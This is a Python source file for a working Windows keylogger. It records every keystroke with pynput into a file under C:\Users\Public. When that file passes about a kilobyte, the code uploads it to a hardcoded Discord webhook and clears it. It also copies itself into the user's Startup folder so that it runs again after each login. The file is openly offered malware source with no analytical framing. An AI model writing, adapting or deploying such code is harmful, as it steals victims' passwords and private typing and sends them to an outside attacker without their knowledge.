from pynput.keyboard import Listener
import os
from discord_webhook import DiscordWebhook, DiscordEmbed
import shutil

user = os.environ["USERNAME"]

def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ' [SHIFT] '
    if key == 'Key.ctrl_l':
        key = ' [CTRL] '
    if key == "Key.enter":
        key = '\n'
    if key == "Key.backspace":
        key = ' [DELETE] '
    if key == "key.cmd":
        key = ' [WINKEY] '

    with open("C:\\Users\\Public\\log.txt", 'a') as f:
        f.write(key)
    size = os.path.getsize("C:\\Users\\Public\\log.txt") / 1000
    if size > 1:
        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/805008211995787285/fXfGRNZXubCFltykjp-SPtXtHazXamvDaHHBh1caKAy9CyOSa-4IehtZFFTu0rot0q7M', username="KeyLogger data", content="KeyLogger log file: ")
        with open("C:\\Users\\Public\\log.txt", "rb") as f:
            webhook.add_file(file=f.read(), filename='lC:\\Users\\Public\\og.txt')
        response = webhook.execute()
        open('C:\\Users\\Public\\log.txt', 'w').close()

def make_persistance():
    try:
        shutil.copy(__file__, "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        return True
    except:
        return False

def keylogger():
    with Listener(on_press=log_keystroke) as l:
        l.join()

def check_persistance():
    if os.path.isfile("C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KeyLogger.py"):
        return True
    else:
        return False

def main():
    print("Checking for persistance")
    if check_persistance():
        keylogger()
    else:
        if make_persistance():
            keylogger()
        else:
            exit()

main()
